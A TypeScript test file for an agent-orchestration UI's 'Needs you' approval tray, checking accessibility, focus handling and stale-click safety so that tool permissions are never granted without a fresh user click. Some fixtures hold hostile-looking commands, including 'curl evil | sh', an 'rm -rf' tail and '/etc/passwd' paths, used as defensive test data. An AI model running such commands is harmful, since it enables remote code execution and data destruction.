/**
 * orchestrator-dock-tray.test.ts
 * @vitest-environment jsdom
 *
 * OrchestratorDock P4: the Needs-you tray inside the reply sheet. The fake manager keeps ONE piece of pending
 * state per thread (like the real one), so "resolve in the sheet OR on the board, both update" is observable:
 * resolvePermission clears the pending state and emits permission_resolved, exactly as the manager does.
 */
import '../setup/obsidian-dom';
import { vi, describe, it, expect, beforeEach } from 'vitest';
import { OrchestratorDock, type OrchestratorDockDeps } from '../../src/orchestratorDock';
import { applyTrayMode } from '../../src/orchestratorDockTray';
import type { Thread } from '../../src/types';

type Ev = { type: string; [k: string]: unknown };
type Listener = (threadId: string, event: Ev) => void;
type Kind = 'permission' | 'question' | 'plan' | 'failed';
interface Spec { id: string; title: string; kind: Kind; tool?: string; detail?: string }

const HOST_EXEC_DETAIL = `Run host_exec for a remote thread: ${JSON.stringify({ command: 'git status' })}`;
const DEFAULT: Spec[] = [
  { id: 'p', title: 'Deploy curation', kind: 'permission', tool: 'Bash', detail: 'npm run deploy --prod' },
  { id: 'q', title: 'Mobile layout polish', kind: 'question' },
  { id: 'pl', title: 'Social nudge', kind: 'plan' },
];

function thread(id: string, over: Partial<Thread> = {}): Thread {
  return { id, title: `Thread ${id}`, cwd: '/r', messages: [{ id: `m-${id}`, role: 'assistant', content: 'hi', timestamp: 0 }], createdAt: 0, updatedAt: 0, status: 'waiting', reviewed: true, ...over } as Thread;
}

function setup(opts: { specs?: Spec[]; mode?: 'pill' | 'orb'; permissionCard?: boolean; open?: boolean; allowAlways?: boolean; remote?: boolean; saveSettings?: () => Promise<void>; hideOrchestratorFromList?: boolean } = {}) {
  const specs = opts.specs ?? DEFAULT;
  const orch = thread('orch', { title: 'Portfolio Orchestrator' });
  const threads: Thread[] = [orch, ...specs.map((s) => thread(s.id, { title: s.title, ...(s.kind === 'failed' ? { lastError: 'boom' } : {}) }))];
  let promptSeq = 0;
  const perms = new Map<string, { toolName: string; detail: string; promptId?: number }>();
  const questions = new Set<string>();
  const plans = new Set<string>();
  for (const s of specs) {
    if (s.kind === 'permission') perms.set(s.id, { toolName: s.tool ?? 'Bash', detail: s.detail ?? '{}', promptId: ++promptSeq });
    if (s.kind === 'question') questions.add(s.id);
    if (s.kind === 'plan') plans.add(s.id);
  }
  const state = { mode: opts.mode ?? ('pill' as 'pill' | 'orb') };
  const listeners = new Set<Listener>();
  const emit = (id: string, type: string, extra: Record<string, unknown> = {}) => { for (const l of [...listeners]) l(id, { type, ...extra }); };
  const manager = {
    getThread: (id: string) => threads.find((t) => t.id === id),
    isRunning: () => false,
    hasPendingPermission: (id: string) => perms.has(id),
    hasPendingQuestion: (id: string) => questions.has(id),
    hasPendingPlan: (id: string) => plans.has(id),
    hasActiveBackgroundTasks: () => false,
    getQueuedMessages: () => [],
    removeQueuedMessageAt: vi.fn(),
    getThreadActivity: () => undefined,
    interrupt: vi.fn(async () => {}),
    sendMessage: vi.fn(async () => {}),
    getPendingPermission: vi.fn((id: string) => perms.get(id)),
    getRemoteScope: vi.fn(() => (opts.remote ? { daemonId: 'd1' } : null)),
    // Real manager: the resolver settles the prompt; promptPermission's finally emits permission_resolved.
    resolvePermission: vi.fn((id: string) => { perms.delete(id); emit(id, 'permission_resolved'); }),
    subscribe: vi.fn((l: Listener) => { listeners.add(l); return () => { listeners.delete(l); }; }),
  };
  const settings = { alwaysAllowedTools: [] as string[], hostExecAlwaysAllowedPrefixes: [] as string[] };
  const saveSettings = vi.fn(opts.saveSettings ?? (async () => {}));
  const deps: OrchestratorDockDeps = {
    manager: manager as never,
    listThreads: () => (opts.hideOrchestratorFromList ? threads.filter((t) => t.id !== 'orch') : threads),
    hasPendingWakeup: () => false,
    getOrchestratorThreadId: () => 'orch',
    ensureOrchestrator: vi.fn(async () => {}),
    openThread: vi.fn(),
    mode: () => state.mode,
    daemons: null,
    ...(opts.permissionCard === false ? {} : { permissionCard: { getSettings: () => settings, saveSettings, hostExecAllowAlways: () => opts.allowAlways ?? true } }),
  } as OrchestratorDockDeps;
  const stage = document.createElement('div');
  stage.className = 'ct-kanban-dispatch';
  const host = document.createElement('div');
  stage.appendChild(host);
  document.body.appendChild(stage);
  const dock = new OrchestratorDock(host, deps);
  dock.mount();
  if (opts.open !== false) dock.openSheet();
  const q = <T extends HTMLElement = HTMLElement>(sel: string) => stage.querySelector(sel) as T | null;
  const qa = (sel: string) => [...stage.querySelectorAll(sel)] as HTMLElement[];
  return {
    dock, deps, manager, stage, q, qa, emit, perms, questions, plans, threads, settings, saveSettings, state,
    tray: () => q('.ct-orch-tray'),
    cards: () => qa('.ct-orch-tray-card'),
    card: (id: string) => q(`.ct-orch-tray-card[data-thread-id="${id}"]`),
    btn: (id: string, name: RegExp | string) => qa(`.ct-orch-tray-card[data-thread-id="${id}"] button`).find((b) => (typeof name === 'string' ? b.textContent === name : name.test(b.textContent ?? ''))),
    /** Tray announcements have their own polite region (the sheet's .ct-orch-live is for streaming / finished replies). */
    live: () => q('.ct-orch-tray-live')?.textContent ?? '',
    sheetLive: () => q('.ct-orch-live')!.textContent,
    /** The board resolving it (or any other surface): the manager state changes, the manager emits. */
    resolveElsewhere: (id: string) => { perms.delete(id); emit(id, 'permission_resolved'); },
    addPermission: (s: Spec) => {
      threads.push(thread(s.id, { title: s.title }));
      perms.set(s.id, { toolName: s.tool ?? 'Bash', detail: s.detail ?? '{}', promptId: ++promptSeq });
      emit(s.id, 'permission_request', { toolName: s.tool ?? 'Bash' });
    },
  };
}
const flush = () => new Promise((r) => setTimeout(r, 0));
const tick = () => new Promise((r) => setTimeout(r, 20));

beforeEach(() => { document.body.innerHTML = ''; });

describe('tray structure + a11y', () => {
  it('is a labelled region inside the sheet dialog, between the transcript and the composer, titled "Needs you (N)"', () => {
    const t = setup();
    const tray = t.tray()!;
    expect(tray.getAttribute('role')).toBe('region');
    expect(tray.getAttribute('aria-label')).toBe('Needs you');
    expect(tray.closest('.ct-orch-sheet')).toBe(t.q('.ct-orch-sheet'));
    expect(tray.querySelector('.ct-orch-tray-title')!.textContent).toBe('Needs you (3)');
    const sheet = t.q('.ct-orch-sheet')!;
    const order = [...sheet.querySelectorAll('.ct-orch-sheet-scroll, .ct-orch-tray-slot, .ct-orch-sheet-composer')].map((e) => e.className.split(' ')[0]);
    expect(order).toEqual(['ct-orch-sheet-scroll', 'ct-orch-tray-slot', 'ct-orch-sheet-composer']);
  });

  it('is in the focus trap of the narrow modal bottom sheet (Tab wraps through its buttons, never out)', () => {
    const t = setup({ mode: 'orb' });
    const sheet = t.q('.ct-orch-sheet')!;
    expect(sheet.getAttribute('aria-modal')).toBe('true');
    const trayButtons = t.qa('.ct-orch-tray button');
    expect(trayButtons.length).toBeGreaterThan(0);
    trayButtons.forEach((b) => expect(sheet.contains(b)).toBe(true));
    // Tab from the last control in the sheet wraps to the first: the tray buttons are in the list the trap walks.
    const last = [...sheet.querySelectorAll<HTMLElement>('button, a[href], textarea, input')].filter((n) => !n.hidden && !n.closest('[hidden]')).pop()!;
    last.focus();
    const ev = new KeyboardEvent('keydown', { key: 'Tab', bubbles: true, cancelable: true });
    sheet.dispatchEvent(ev);
    expect(ev.defaultPrevented).toBe(true);
    expect(sheet.contains(document.activeElement)).toBe(true);
  });

  it('every action has an accessible name that includes the thread title', () => {
    const t = setup();
    expect(t.btn('p', 'Deny')!.getAttribute('aria-label')).toBe('Deny Bash for Deploy curation');
    expect(t.btn('p', 'Allow')!.getAttribute('aria-label')).toBe('Allow Bash for Deploy curation');
    expect(t.btn('p', 'Always')!.getAttribute('aria-label')).toBe('Always Bash for Deploy curation');
    expect(t.btn('q', 'Answer…')!.getAttribute('aria-label')).toBe('Answer Mobile layout polish in its thread');
    expect(t.btn('pl', 'Review plan…')!.getAttribute('aria-label')).toBe('Review plan for Social nudge');
  });

  it('cards live in a list; DOM order is board order (permission, question, plan here)', () => {
    const t = setup();
    expect(t.q('.ct-orch-tray ul')).toBeTruthy();
    expect(t.cards().map((c) => c.dataset.threadId)).toEqual(['p', 'q', 'pl']);
  });
});

describe('what the tray lists', () => {
  it('matches the attention list: awaiting threads only, failures excluded, count in the heading', () => {
    const t = setup({ specs: [...DEFAULT, { id: 'f', title: 'Relay backoff', kind: 'failed' }] });
    expect(t.cards().map((c) => c.dataset.threadId)).toEqual(['p', 'q', 'pl']);
    expect(t.q('.ct-orch-tray-title')!.textContent).toBe('Needs you (3)');
  });

  it('includes the orchestrator\'s OWN pending permission', () => {
    const t = setup({ specs: [] });
    t.perms.set('orch', { toolName: 'Edit', detail: JSON.stringify({ file_path: '/r/a.ts' }) });
    t.emit('orch', 'permission_request');
    expect(t.cards().map((c) => c.dataset.threadId)).toEqual(['orch']);
    expect(t.btn('orch', 'Deny')).toBeTruthy();
  });

  it('has no tray (no empty region) when nothing awaits', () => {
    const t = setup({ specs: [{ id: 'f', title: 'Failed one', kind: 'failed' }] });
    expect(t.tray()).toBeNull();
  });

  it('removes the tray when the last item is resolved', () => {
    const t = setup({ specs: [DEFAULT[0]] });
    expect(t.tray()).toBeTruthy();
    t.resolveElsewhere('p');
    expect(t.tray()).toBeNull();
  });
});

describe('permission cards reuse the board buttons', () => {
  it('shows the tool chip, the summarised detail and Deny / Allow / Always', () => {
    const t = setup();
    const card = t.card('p')!;
    expect(card.querySelector('.ct-orch-tray-name')!.textContent).toBe('Deploy curation');
    expect(card.querySelector('.ct-agents-permission-tool')!.textContent).toBe('Bash');
    expect(card.querySelector('.ct-agents-permission-detail')!.textContent).toBe('npm run deploy --prod');
    expect([...card.querySelectorAll('.ct-permission-btn')].map((b) => b.textContent)).toEqual(['Deny', 'Allow', 'Always']);
  });

  it('host_exec: Allow once + Always `prefix` (the shared helper\'s variants)', () => {
    const t = setup({ specs: [{ id: 'h', title: 'Remote job', kind: 'permission', tool: 'mcp__claude_threads__host_exec', detail: HOST_EXEC_DETAIL }] });
    expect([...t.card('h')!.querySelectorAll('.ct-permission-btn')].map((b) => b.textContent)).toEqual(['Deny', 'Allow once', 'Always `git status`']);
  });

  it('Deny / Allow call manager.resolvePermission(threadId, allow) and nothing else', async () => {
    const t = setup();
    t.btn('p', 'Deny')!.click();
    await flush();
    expect(t.manager.resolvePermission.mock.calls).toEqual([['p', false]]);
    const t2 = setup();
    t2.btn('p', 'Allow')!.click();
    await flush();
    expect(t2.manager.resolvePermission.mock.calls).toEqual([['p', true]]);
  });

  it('Always records the allowance through the lazily read settings, then resolves', async () => {
    const t = setup();
    t.btn('p', 'Always')!.click();
    await flush();
    expect(t.settings.alwaysAllowedTools).toEqual(['Bash']);
    expect(t.saveSettings).toHaveBeenCalledTimes(1);
    expect(t.manager.resolvePermission).toHaveBeenCalledWith('p', true);
  });

  it('NEVER approves anything without a click: render, refresh, relayout, reopen and unrelated events resolve nothing', () => {
    const t = setup();
    t.dock.refresh();
    t.dock.relayout();
    t.emit('p', 'permission_request');
    t.emit('q', 'pending_question_changed');
    t.dock.closeSheet();
    t.dock.openSheet();
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
    expect(t.saveSettings).not.toHaveBeenCalled();
  });

  it('a card click does not bubble (the pill / board must not see it)', () => {
    const t = setup();
    const outer = vi.fn();
    t.stage.addEventListener('click', outer);
    t.btn('p', 'Deny')!.click();
    expect(outer).not.toHaveBeenCalled();
  });

  it('without permissionCard deps the card hands off instead of showing buttons that would not persist an Always', () => {
    const t = setup({ permissionCard: false });
    expect(t.card('p')!.querySelector('.ct-permission-btn')).toBeNull();
    t.btn('p', 'Open thread…')!.click();
    expect(t.deps.openThread).toHaveBeenCalledWith('p');
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
  });

  it('a permission that vanished between classification and render hands off rather than offering dead buttons', () => {
    const t = setup();
    t.perms.delete('p'); // gone, but hasPendingPermission is what attentionItems read first: emulate the race
    t.manager.hasPendingPermission = (id: string) => id === 'p' || t.perms.has(id);
    t.dock.refresh();
    expect(t.card('p')!.querySelector('.ct-permission-btn')).toBeNull();
    expect(t.btn('p', 'Open thread…')).toBeTruthy();
  });
});

describe('resolving in either place resolves both', () => {
  it('sheet -> board: clicking in the tray resolves through the manager, the card leaves the tray, and the manager state is cleared for the board', async () => {
    const t = setup();
    t.btn('p', 'Allow')!.click();
    await flush();
    expect(t.card('p')).toBeNull();
    expect(t.manager.hasPendingPermission('p')).toBe(false); // the board reads this same state
    expect(t.cards().map((c) => c.dataset.threadId)).toEqual(['q', 'pl']);
    expect(t.q('.ct-orch-tray-title')!.textContent).toBe('Needs you (2)');
  });

  it('board -> sheet: the board resolving the same permission removes the tray card', () => {
    const t = setup();
    t.resolveElsewhere('p');
    expect(t.card('p')).toBeNull();
    expect(t.cards()).toHaveLength(2);
  });

  it('a new permission request appears as a card', () => {
    const t = setup({ specs: [] });
    expect(t.tray()).toBeNull();
    t.addPermission({ id: 'n', title: 'New one', kind: 'permission', tool: 'Write', detail: '{}' });
    expect(t.card('n')).toBeTruthy();
    expect(t.btn('n', 'Deny')).toBeTruthy();
  });
});

describe('question and plan items hand off, never resolve inline', () => {
  it('a question has ONE button, "Answer…", which opens that thread', () => {
    const t = setup();
    const btns = t.qa('.ct-orch-tray-card[data-thread-id="q"] button');
    expect(btns.map((b) => b.textContent)).toEqual(['Answer…']);
    btns[0].click();
    expect(t.deps.openThread).toHaveBeenCalledWith('q');
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
    expect(t.manager.sendMessage).not.toHaveBeenCalled();
  });

  it('a plan has ONE button, "Review plan…", which opens that thread', () => {
    const t = setup();
    const btns = t.qa('.ct-orch-tray-card[data-thread-id="pl"] button');
    expect(btns.map((b) => b.textContent)).toEqual(['Review plan…']);
    btns[0].click();
    expect(t.deps.openThread).toHaveBeenCalledWith('pl');
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
  });

  it('opening a thread leaves the sheet open', () => {
    const t = setup();
    t.btn('q', 'Answer…')!.click();
    expect(t.q('.ct-orch-sheet')!.hidden).toBe(false);
  });
});

describe('collapse beyond three', () => {
  const five: Spec[] = Array.from({ length: 5 }, (_, i) => ({ id: `t${i}`, title: `Thread ${i}`, kind: 'permission' as const, tool: 'Bash', detail: `cmd ${i}` }));

  it('three or fewer: no toggle', () => {
    const t = setup();
    expect(t.q('.ct-orch-tray-toggle')).toBeNull();
  });

  it('five: three cards + "Show 2 more"; the heading still counts all five', () => {
    const t = setup({ specs: five });
    expect(t.cards()).toHaveLength(3);
    const toggle = t.q<HTMLButtonElement>('.ct-orch-tray-toggle')!;
    expect(toggle.textContent).toBe('Show 2 more');
    expect(toggle.getAttribute('aria-expanded')).toBe('false');
    expect(t.q('.ct-orch-tray-title')!.textContent).toBe('Needs you (5)');
  });

  it('the toggle expands to all five and back; the same button node keeps focus', () => {
    const t = setup({ specs: five });
    const toggle = t.q<HTMLButtonElement>('.ct-orch-tray-toggle')!;
    toggle.focus();
    toggle.click();
    expect(t.cards()).toHaveLength(5);
    expect(t.q('.ct-orch-tray-toggle')).toBe(toggle);
    expect(toggle.textContent).toBe('Show fewer');
    expect(toggle.getAttribute('aria-expanded')).toBe('true');
    expect(document.activeElement).toBe(toggle);
    toggle.click();
    expect(t.cards()).toHaveLength(3);
    expect(toggle.textContent).toBe('Show 2 more');
  });

  it('resolving a visible card pulls the next hidden one in; resolving down to three drops the toggle', () => {
    const t = setup({ specs: five });
    t.resolveElsewhere('t0');
    expect(t.cards().map((c) => c.dataset.threadId)).toEqual(['t1', 't2', 't3']);
    expect(t.q('.ct-orch-tray-toggle')!.textContent).toBe('Show 1 more');
    t.resolveElsewhere('t1');
    expect(t.q('.ct-orch-tray-toggle')).toBeNull();
    expect(t.cards()).toHaveLength(3);
  });
});

describe('announcements and focus', () => {
  it('a new request is announced politely as "<title> needs approval" and does not move focus', async () => {
    const t = setup();
    const input = t.q<HTMLTextAreaElement>('textarea.ct-orch-input')!;
    input.focus();
    t.addPermission({ id: 'n', title: 'Ship the thing', kind: 'permission' });
    await tick();
    expect(t.live()).toBe('Ship the thing needs approval');
    expect(t.q('.ct-orch-tray-live')!.getAttribute('aria-live')).toBe('polite');
    expect(document.activeElement).toBe(input);
  });

  it('what is already listed when the sheet opens is NOT announced', () => {
    const t = setup();
    expect(t.live()).toBe('');
  });

  it('a resolved-then-requested thread is announced again; unrelated refreshes announce nothing', async () => {
    const t = setup();
    t.dock.refresh();
    expect(t.live()).toBe('');
    t.resolveElsewhere('p');
    t.perms.set('p', { toolName: 'Bash', detail: 'again', promptId: 99 });
    t.emit('p', 'permission_request');
    await tick();
    expect(t.live()).toBe('Deploy curation needs approval');
  });

  it('arrivals while the sheet is CLOSED do not open it and do not announce on reopen', () => {
    const t = setup({ open: false, specs: [DEFAULT[1]] });
    t.addPermission({ id: 'n', title: 'Ship the thing', kind: 'permission' });
    expect(t.q('.ct-orch-sheet')!.hidden).toBe(true);
    t.dock.openSheet();
    expect(t.live()).toBe('');
    expect(t.card('n')).toBeTruthy();
  });

  it('when the focused card is resolved, focus moves to the next card\'s first button (not lost to <body>)', () => {
    const t = setup();
    t.btn('p', 'Deny')!.focus();
    t.resolveElsewhere('p');
    expect(document.activeElement).toBe(t.btn('q', 'Answer…'));
  });

  it('when the last card is resolved under focus, focus goes into the composer', () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.btn('p', 'Deny')!.focus();
    t.resolveElsewhere('p');
    expect(document.activeElement).toBe(t.q('textarea.ct-orch-input'));
  });

  it('a refresh that changes nothing keeps the same card and button nodes (focus + clicks survive)', () => {
    const t = setup();
    const deny = t.btn('p', 'Deny');
    deny!.focus();
    t.dock.refresh();
    t.emit('q', 'pending_question_changed');
    expect(t.btn('p', 'Deny')).toBe(deny);
    expect(document.activeElement).toBe(deny);
  });
});

describe('lifecycle', () => {
  it('destroy removes the tray and later events do nothing', () => {
    const t = setup();
    t.dock.destroy();
    expect(t.tray()).toBeNull();
    expect(() => t.emit('p', 'permission_resolved')).not.toThrow();
  });
});


// ── approval safety: a click may only resolve the prompt the user SAW ────────────────────────────────────────────────

describe('stale-click safety (a click resolves only the request that was on screen)', () => {
  it('Always, then the queue advances during the settings await: resolves NOTHING and persists nothing for the new prompt', async () => {
    let t!: ReturnType<typeof setup>;
    // While Always awaits saveSettings, the board's Deny settled A and B (other tool, other detail) took the front.
    t = setup({
      specs: [DEFAULT[0]],
      saveSettings: async () => { t.perms.set('p', { toolName: 'Write', detail: 'B: /etc/passwd', promptId: 2 }); },
    });
    t.btn('p', 'Always')!.click();
    await flush();
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
    expect(t.settings.alwaysAllowedTools).toEqual(['Bash']); // only what the user saw and chose; never B's tool
    expect(t.settings.alwaysAllowedTools).not.toContain('Write');
  });

  it('Always `prefix` with the same race: nothing resolved, B\'s command is never recorded', async () => {
    let t!: ReturnType<typeof setup>;
    t = setup({
      specs: [{ id: 'h', title: 'Remote job', kind: 'permission', tool: 'mcp__claude_threads__host_exec', detail: HOST_EXEC_DETAIL }],
      saveSettings: async () => { t.perms.set('h', { toolName: 'mcp__claude_threads__host_exec', detail: `Run host_exec for a remote thread: ${JSON.stringify({ command: 'git push' })}`, promptId: 2 }); },
    });
    t.btn('h', /^Always `git status`/)!.click();
    await flush();
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
    expect(t.settings.hostExecAlwaysAllowedPrefixes).toEqual(['git status']);
  });

  it('double Allow with an identical queued B resolves exactly once (the first click disables the card)', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    // The manager settles A, then the queue immediately raises B with the SAME tool and detail.
    t.manager.resolvePermission.mockImplementation((id: string) => {
      t.perms.delete(id); t.emit(id, 'permission_resolved');
      t.perms.set(id, { toolName: 'Bash', detail: 'npm run deploy --prod', promptId: 2 }); t.emit(id, 'permission_request');
    });
    const first = t.btn('p', 'Allow')!;
    first.click();
    first.click();
    await flush();
    expect(t.manager.resolvePermission).toHaveBeenCalledTimes(1);
    // B is a NEW card with live, untouched buttons: it still needs its own decision.
    const fresh = t.btn('p', 'Allow')!;
    expect(fresh).not.toBe(first);
    expect(fresh.disabled).toBe(false);
  });

  it('the first click disables every button of the card', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.manager.resolvePermission.mockImplementation(() => {}); // an action that does not settle the prompt
    t.btn('p', 'Deny')!.click();
    const all = [...t.card('p')!.querySelectorAll<HTMLButtonElement>('.ct-orch-tray-actions button')];
    expect(all.length).toBeGreaterThan(0);
    all.forEach((b) => expect(b.disabled).toBe(true));
  });

  it('re-enables the buttons only if the request is still pending afterwards (the action did not take)', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.manager.resolvePermission.mockImplementation(() => {}); // still pending
    t.btn('p', 'Allow')!.click();
    await tick();
    expect(t.btn('p', 'Allow')!.disabled).toBe(false);
    const t2 = setup({ specs: [DEFAULT[0]] }); // real behaviour: resolved -> card leaves
    t2.btn('p', 'Allow')!.click();
    await tick();
    expect(t2.card('p')).toBeNull();
  });

  it('a stale click after the tool / detail changed does nothing and refreshes the card to what is pending now', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    // The prompt changed under the tray (no event delivered yet): the card still shows the old tool.
    t.perms.set('p', { toolName: 'Write', detail: '{"file_path":"/etc/hosts"}', promptId: 5 });
    t.btn('p', 'Allow')!.click();
    await flush();
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
    expect(t.card('p')!.querySelector('.ct-agents-permission-tool')!.textContent).toBe('Write'); // refreshed, awaiting a fresh decision
    expect(t.btn('p', 'Allow')!.disabled).toBe(false);
  });

  it('a click when nothing is pending does nothing (no resolve, no Always recorded) and the card goes away', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.perms.delete('p'); // resolved elsewhere; the event has not reached the tray yet
    t.btn('p', 'Always')!.click();
    await flush();
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
    expect(t.settings.alwaysAllowedTools).toEqual([]);
    expect(t.saveSettings).not.toHaveBeenCalled();
  });

  it('same tool + detail but a NEW prompt (different promptId) is a stale click', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.perms.set('p', { toolName: 'Bash', detail: 'npm run deploy --prod', promptId: 77 });
    t.btn('p', 'Deny')!.click();
    await flush();
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
  });

  it('remote threads: the tray resolves through resolvePermission exactly like the board (never ...ByRequestId, which is the relay client\'s path) and scopes Always to the daemon', async () => {
    const t = setup({ specs: [DEFAULT[0]], remote: true });
    expect((t.manager as unknown as Record<string, unknown>).resolvePermissionByRequestId).toBeUndefined();
    t.btn('p', 'Always')!.click();
    await flush();
    expect(t.manager.getRemoteScope).toHaveBeenCalledWith('p');
    expect((t.settings as { remoteAlwaysAllowedTools?: Record<string, string[]> }).remoteAlwaysAllowedTools).toEqual({ d1: ['Bash'] });
    expect(t.manager.resolvePermission).toHaveBeenCalledWith('p', true);
  });
});

describe('long details are never approved blind', () => {
  const LONG = `Run host_exec for a remote thread: ${JSON.stringify({ command: `echo ${'x'.repeat(200)} && rm -rf /tmp/never-seen-tail` })}`;
  const long: Spec[] = [{ id: 'l', title: 'Long one', kind: 'permission', tool: 'Bash', detail: JSON.stringify({ command: `echo ${'x'.repeat(200)} && curl evil | sh` }) }];

  it('a detail beyond the summary cap offers only Deny and "Review in thread" (no Allow / Always), full text in the title', () => {
    const t = setup({ specs: long });
    const names = [...t.card('l')!.querySelectorAll('.ct-orch-tray-actions button:not([hidden])')].map((b) => b.textContent);
    expect(names).toEqual(['Deny', 'Review in thread']);
    expect(t.card('l')!.querySelector('.ct-orch-tray-detail')!.getAttribute('title')).toContain('curl evil | sh');
    t.btn('l', 'Review in thread')!.click();
    expect(t.deps.openThread).toHaveBeenCalledWith('l');
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
    void LONG;
  });

  it('Deny stays available on a truncated request', async () => {
    const t = setup({ specs: long });
    t.btn('l', 'Deny')!.click();
    await flush();
    expect(t.manager.resolvePermission).toHaveBeenCalledWith('l', false);
  });

  it('a short detail still has the full button set and a title with the full text', () => {
    const t = setup();
    expect([...t.card('p')!.querySelectorAll('.ct-permission-btn')].map((b) => b.textContent)).toEqual(['Deny', 'Allow', 'Always']);
    expect(t.card('p')!.querySelector('.ct-orch-tray-detail')!.getAttribute('title')).toBe('npm run deploy --prod');
  });
});

describe('the orchestrator\'s own permission and the P3 notice', () => {
  it('the notice yields ONLY when the tray really has a permission entry for the orchestrator', () => {
    const t = setup({ specs: [] });
    t.perms.set('orch', { toolName: 'Edit', detail: '{}', promptId: 1 });
    t.emit('orch', 'permission_request');
    expect(t.card('orch')).toBeTruthy();
    expect(t.q('.ct-orch-notice')).toBeNull();
  });

  it('a `background` orchestrator that the board does not list is still listed in the tray, and the notice yields', () => {
    const t = setup({ specs: [], hideOrchestratorFromList: true });
    t.perms.set('orch', { toolName: 'Edit', detail: '{}', promptId: 1 });
    t.emit('orch', 'permission_request');
    expect(t.card('orch')).toBeTruthy();
    expect(t.btn('orch', 'Deny')).toBeTruthy();
    expect(t.q('.ct-orch-notice')).toBeNull();
  });

  it('without permissionCard deps the tray has only a hand-off entry, so the notice stays', () => {
    const t = setup({ specs: [], permissionCard: false });
    t.perms.set('orch', { toolName: 'Edit', detail: '{}', promptId: 1 });
    t.emit('orch', 'permission_request');
    expect(t.card('orch')!.querySelector('.ct-orch-tray-actions button')!.textContent).toBe('Open thread…');
    expect(t.q('.ct-orch-notice')).toBeTruthy();
  });

  it('a pending permission whose pending info vanished leaves the notice in place (no tray buttons to take over)', () => {
    const t = setup({ specs: [] });
    t.perms.set('orch', { toolName: 'Edit', detail: '{}', promptId: 1 });
    t.manager.hasPendingPermission = (id: string) => id === 'orch';
    t.perms.delete('orch');
    t.emit('orch', 'permission_request');
    expect(t.q('.ct-orch-notice')).toBeTruthy();
  });
});

describe('announcements: their own region, re-announced, capped', () => {
  it('go to a dedicated polite region and never touch the sheet\'s streaming / reply region', async () => {
    const t = setup({ specs: [] });
    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
    await tick();
    expect(t.live()).toBe('Ship it needs approval');
    expect(t.q('.ct-orch-tray-live')!.getAttribute('aria-live')).toBe('polite');
    expect(t.q('.ct-orch-tray-live')!.closest('.ct-orch-sheet')).toBeTruthy();
    expect(t.sheetLive()).toBe('');
  });

  it('identical repeated text is announced again (the region is cleared before it is set)', async () => {
    const t = setup({ specs: [] });
    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
    await tick();
    const seen: string[] = [];
    new MutationObserver(() => seen.push(t.live())).observe(t.q('.ct-orch-tray-live')!, { childList: true, characterData: true, subtree: true });
    t.resolveElsewhere('n');
    t.perms.set('n', { toolName: 'Bash', detail: '{}', promptId: 50 }); // a new prompt, same thread
    t.emit('n', 'permission_request');
    await tick();
    expect(t.live()).toBe('Ship it needs approval');
    expect(seen).toContain(''); // cleared in between, so assistive tech sees a change
  });

  it('several arriving at once are capped: two named, the rest counted', async () => {
    const t = setup({ specs: [] });
    for (let i = 0; i < 5; i++) { t.threads.push({ id: `n${i}`, title: `T${i}`, cwd: '/r', messages: [{ id: `m${i}`, role: 'assistant', content: 'x', timestamp: 0 }], createdAt: 0, updatedAt: 0, status: 'waiting', reviewed: true } as never); t.perms.set(`n${i}`, { toolName: 'Bash', detail: '{}', promptId: 100 + i }); }
    t.emit('n0', 'permission_request'); // ONE refresh sees all five arrive
    await tick();
    const text = t.live();
    expect(text.length).toBeLessThan(120);
    expect(text).toMatch(/and \d+ more/);
  });

  it('a #903 streaming announcement and a tray announcement do not overwrite each other', async () => {
    const t = setup({ specs: [] });
    t.q('.ct-orch-live')!.textContent = 'Orchestrator replied: hello';
    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
    await tick();
    expect(t.sheetLive()).toBe('Orchestrator replied: hello');
    expect(t.live()).toBe('Ship it needs approval');
  });
});

describe('queued permissions on one thread (resolved -> next request)', () => {
  it('never drops focus to <body> across the gap, and announces only the genuinely new prompt', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.btn('p', 'Deny')!.focus();
    t.resolveElsewhere('p'); // card gone between permission_resolved and the next permission_request
    expect(document.activeElement).not.toBe(document.body);
    expect(t.stage.contains(document.activeElement)).toBe(true);
    t.perms.set('p', { toolName: 'Bash', detail: 'second prompt', promptId: 2 });
    t.emit('p', 'permission_request');
    await tick();
    expect(t.card('p')!.querySelector('.ct-agents-permission-detail')!.textContent).toBe('second prompt');
    expect(t.live()).toBe('Deploy curation needs approval');
    t.dock.refresh();
    t.emit('q', 'pending_question_changed');
    await tick();
    expect(t.live()).toBe('Deploy curation needs approval'); // unchanged, and no extra announcement was queued
  });
});

describe('narrow modal sheet: Show N more inside the focus trap', () => {
  const five: Spec[] = Array.from({ length: 5 }, (_, i) => ({ id: `t${i}`, title: `Thread ${i}`, kind: 'permission' as const, tool: 'Bash', detail: `cmd ${i}` }));

  it('the toggle is one of the trap\'s stops, and Tab wraps from the last control back inside the sheet', () => {
    const t = setup({ specs: five, mode: 'orb' });
    const sheet = t.q('.ct-orch-sheet')!;
    const stops = () => [...sheet.querySelectorAll<HTMLElement>('button, a[href], textarea, input')].filter((n) => !n.hidden && !n.closest('[hidden]') && !(n as HTMLButtonElement).disabled);
    expect(stops()).toContain(t.q('.ct-orch-tray-toggle'));
    t.q<HTMLButtonElement>('.ct-orch-tray-toggle')!.click();
    expect(t.cards()).toHaveLength(5);
    const last = stops().pop()!;
    last.focus();
    const ev = new KeyboardEvent('keydown', { key: 'Tab', bubbles: true, cancelable: true });
    sheet.dispatchEvent(ev);
    expect(ev.defaultPrevented).toBe(true);
    expect(sheet.contains(document.activeElement)).toBe(true);
  });
});

describe('the transcript stays pinned across the tray appearing / disappearing', () => {
